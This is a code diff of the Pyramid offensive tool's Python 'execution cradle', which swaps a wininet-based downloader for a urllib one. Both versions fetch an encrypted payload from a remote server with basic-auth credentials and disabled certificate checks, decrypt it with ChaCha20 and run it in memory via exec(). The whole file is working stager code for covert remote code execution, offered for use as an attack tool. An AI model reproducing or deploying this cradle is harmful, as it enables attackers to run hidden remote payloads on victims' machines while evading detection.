@@ -1,9 +1,9 @@
 '''
-Author: @naksyn (c) 2024
+Author: @naksyn (c) 2023
 
 Description: Pyramid module execution cradle to download, decrypt and execute in-memory. 
 
-Copyright 2024
+Copyright 2023
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
 to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
 and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
@@ -15,9 +15,10 @@ OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 '''
 
 import struct
+import urllib.request
 import base64
-import ctypes
-from ctypes import wintypes, byref, create_string_buffer
+import ssl
+import hashlib
 
 ### GENERAL CONFIG ####
 
@@ -28,41 +29,16 @@ user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 
 pyramid_server='192.168.1.2'
 pyramid_port='80'
+pyramid_user='test'
+pyramid_pass='pass'
 encryption='chacha20'
-encryptionpass='superpass'
+encryptionpass='chacha20'
 chacha20IV=b'12345678'
 pyramid_http='http'
 encode_encrypt_url='/login/'
-pyramid_module='pythonmemorymodule_opsec.py'
+pyramid_module='pythonmemorymodule.py'
 
 ### END DELIMITER
-
-wininet = ctypes.WinDLL('wininet.dll')
-
-# constants
-INTERNET_PORT = ctypes.c_ushort
-INTERNET_OPEN_TYPE_DIRECT = 1
-INTERNET_FLAG_RELOAD = 0x80000000
-HTTP_QUERY_STATUS_CODE = 19
-HTTP_QUERY_CONTENT_LENGTH = 5
-
-# function prototypes
-wininet.InternetOpenW.restype = wintypes.HANDLE
-wininet.InternetOpenW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
-
-wininet.InternetConnectW.restype = wintypes.HANDLE
-wininet.InternetConnectW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, INTERNET_PORT, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
-
-wininet.HttpOpenRequestW.restype = wintypes.HANDLE
-wininet.HttpOpenRequestW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(wintypes.LPCWSTR), wintypes.DWORD, ctypes.c_void_p]
-
-wininet.HttpSendRequestW.restype = wintypes.BOOL
-wininet.HttpSendRequestW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD]
-
-wininet.InternetReadFile.restype = wintypes.BOOL
-wininet.InternetReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
-
-hInternet = wininet.InternetOpenW(user_agent, INTERNET_OPEN_TYPE_DIRECT, None, None, 0)
 
 
 def encrypt_wrapper(data, encryption):
@@ -159,67 +135,17 @@ def encrypt(data, key, iv=None, position=0):
       
       
       
-#gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-#gcontext.check_hostname = False
-#gcontext.verify_mode = ssl.CERT_NONE
-if not hInternet:
-    raise Exception("InternetOpen failed")
+gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+gcontext.check_hostname = False
+gcontext.verify_mode = ssl.CERT_NONE
 
-# Connect to the HTTP server
-server_name = pyramid_server
-port = pyramid_port
-hConnect = wininet.InternetConnectW(hInternet, server_name, int(port), None, None, 3, 0, 0)
+request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
+                  base64.b64encode((encrypt_wrapper((pyramid_module).encode(), encryption))).decode('utf-8'), \
+				  headers={'User-Agent': user_agent})
+base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
+request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
 
-
-if not hConnect:
-    wininet.InternetCloseHandle(hInternet)
-    raise Exception("InternetConnect failed")
-
-# Create an HTTP request handle
-http_method = "GET"
-object_name = encode_encrypt_url + \
-                  base64.b64encode((encrypt_wrapper((pyramid_module).encode(), encryption))).decode('utf-8')  # The URL path to the resource
-hRequest = wininet.HttpOpenRequestW(hConnect, http_method, object_name, None, None, None, INTERNET_FLAG_RELOAD, 0)
-
-
-if not hRequest:
-    wininet.InternetCloseHandle(hConnect)
-    wininet.InternetCloseHandle(hInternet)
-    raise Exception("HttpOpenRequest failed")
-
-# Send the request
-if not wininet.HttpSendRequestW(hRequest, None, 0, None, 0):
-    wininet.InternetCloseHandle(hRequest)
-    wininet.InternetCloseHandle(hConnect)
-    wininet.InternetCloseHandle(hInternet)
-    raise Exception("HttpSendRequest failed")
-
-# At this point, you can read the response using InternetReadFile
-
-# Buffer and variable to store the response
-BUFFER_SIZE = 4096
-dwBytesRead = wintypes.DWORD(0)
-response = []
-
-# Read the response
-buffer = create_string_buffer(BUFFER_SIZE)
-while True:
-    if not wininet.InternetReadFile(hRequest, buffer, BUFFER_SIZE, byref(dwBytesRead)):
-        break
-
-    if dwBytesRead.value == 0:
-        # end of the response
-        break
-
-    # Append the data read to the response list
-    response.append(buffer[:dwBytesRead.value])
-
-# Convert the list of bytes to a single bytes object
-payload = b''.join(response)
-
-wininet.InternetCloseHandle(hRequest)
-wininet.InternetCloseHandle(hConnect)
-wininet.InternetCloseHandle(hInternet)
-
+result = urllib.request.urlopen(request, context=gcontext)
+payload=result.read()
 paydec=encrypt_wrapper(payload,encryption)
 exec(paydec.decode('utf-8'))
